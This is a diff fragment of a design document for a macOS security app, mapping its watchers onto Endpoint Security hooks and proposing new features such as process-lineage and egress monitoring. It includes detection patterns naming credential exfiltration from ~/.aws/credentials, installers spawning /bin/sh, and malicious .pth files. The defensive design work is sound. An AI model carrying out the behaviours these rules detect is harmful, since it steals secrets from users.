+| `SelfProtection` (Phase 15a) | DispatchSource on plist, 15 s cooldown restore | Kernel denies unauthorised `unlink`/`rename` on our plist — no race window |
+| `FileWatcher` (Phase 7) | Post-write events on watched paths | Pre-write AUTH_WRITE; can deny writes to protected paths |
+| `ModelDirectoryWatcher` (Phase 13) | Re-hash on directory change | Per-read AUTH_OPEN; detect tampering the moment someone reads a tampered model |
+| `CommandPolicy` (Phase 13) | Advisory via MCP tool | Block `exec()` system-wide |
+| `PythonPthWatcher` (Phase 16) | Detect-and-alert post-write | Deny write of code-bearing `.pth` before pip finishes |
+| `DependencyDriftWatcher` (Phase 16) | Alert on manifest change | Block `pip install` / `npm install` if OSV returns deny |
+| `SenderWhitelist` | Advisory alerts | No change — already the right layer |
+
+New features unlocked by ES (not currently in any phase):
+
+| Feature | What it unlocks | Closes which gap |
+|---|---|---|
+| **Real-time process-lineage monitor** | `exec()` events with full PPID tree, live — catches "npm install spawned /bin/sh" at syscall time, not 30 s later | ProcessMonitor polling blind-spot |
+| **Network egress correlation** | Correlate `process A read ~/.aws/credentials → A or child opens socket to non-AWS IP within N s` | Credential exfiltration (currently nothing) |
+| **Privacy Router as in-kernel interceptor** | Intercept outbound LLM API calls at socket level — no HTTPS MITM cert needed | Simpler than user-space proxy |
+| **AI-agent sandbox enforcement** | Per-agent policy enforced system-wide, even without `ai-exec` wrapper | User-space wrapper bypassable today |
+| **Real-time TCC grant interception** | Intercept `AuthorizationCopyRights` + show our own consent UI before the OS grants | TCCMonitor sees grants post-hoc only |
+
+---
+
+### Phase 15a: Security Hardening Audit — Self-Protection & Tamper Resistance
 
 **Completed: 2026-04-16** — an end-to-end security audit of the app itself,
 followed by targeted fixes for every finding. Goal: make AISecurity safe
